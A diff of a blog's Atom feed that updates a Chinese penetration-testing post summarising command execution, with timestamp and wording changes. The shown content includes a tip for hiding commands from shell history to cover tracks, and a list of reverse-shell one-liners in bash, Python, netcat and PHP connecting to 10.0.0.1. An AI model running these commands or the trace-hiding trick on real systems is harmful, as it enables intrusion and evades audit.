@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.tharavel.site/"/>
-  <updated>2018-03-23T08:24:41.928Z</updated>
+  <updated>2018-03-23T08:37:57.562Z</updated>
   <id>http://www.tharavel.site/</id>
   
   <author>
@@ -20,9 +20,9 @@
     <link href="http://www.tharavel.site/2018/03/23/command-execute.html"/>
     <id>http://www.tharavel.site/2018/03/23/command-execute.html</id>
     <published>2018-03-23T08:04:37.753Z</published>
-    <updated>2018-03-23T08:24:41.928Z</updated>
+    <updated>2018-03-23T08:37:57.562Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="各种命令执行总结"><a href="#各种命令执行总结" class="headerlink" title="各种命令执行总结"></a>各种命令执行总结</h1><p>好久没更博客了，就把笔记里的东西整理一下发出来水一篇~</p>
+    <content type="html"><![CDATA[<h1 id="各种命令执行总结"><a href="#各种命令执行总结" class="headerlink" title="各种命令执行总结"></a>各种命令执行总结</h1><p>好久没更博客了，就把笔记里的东西整理一下发出来水一篇~<br>本文持续更新~</p>
 <hr>
 <p>首先说一个小trick:<br>在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加<code>空格</code>即可，该方法仅限在debain内核的系统中。</p>
 <h3 id="0X01-linux命令执行"><a href="#0X01-linux命令执行" class="headerlink" title="0X01 linux命令执行"></a>0X01 <strong>linux命令执行</strong></h3><h4 id="如何判断是否是linux命令执行"><a href="#如何判断是否是linux命令执行" class="headerlink" title="如何判断是否是linux命令执行"></a><strong>如何判断是否是linux命令执行</strong></h4><p>可以使用的判断方法有&amp;+命令或|+命令，如：</p>
@@ -106,7 +106,7 @@
 <h3 id="0X02-常用shell反弹"><a href="#0X02-常用shell反弹" class="headerlink" title="0X02 常用shell反弹"></a>0X02 <strong>常用shell反弹</strong></h3><p>网上有很多文章总结了，这里简单列举几个:  </p>
 <blockquote>
 <p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<p>python -c \’import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
 <p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f </p>
 <p>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
 </blockquote>
@@ -174,9 +174,8 @@
     
     <summary type="html">
     
-      &lt;h1 id=&quot;各种命令执行总结&quot;&gt;&lt;a href=&quot;#各种命令执行总结&quot; class=&quot;headerlink&quot; title=&quot;各种命令执行总结&quot;&gt;&lt;/a&gt;各种命令执行总结&lt;/h1&gt;&lt;p&gt;好久没更博客了，就把笔记里的东西整理一下发出来水一篇~&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;首先说一个小
+      &lt;h1 id=&quot;各种命令执行总结&quot;&gt;&lt;a href=&quot;#各种命令执行总结&quot; class=&quot;headerlink&quot; title=&quot;各种命令执行总结&quot;&gt;&lt;/a&gt;各种命令执行总结&lt;/h1&gt;&lt;p&gt;好久没更博客了，就把笔记里的东西整理一下发出来水一篇~&lt;br&gt;本文持续更新~&lt;/p&gt;
+&lt;hr
     
     </summary>
     
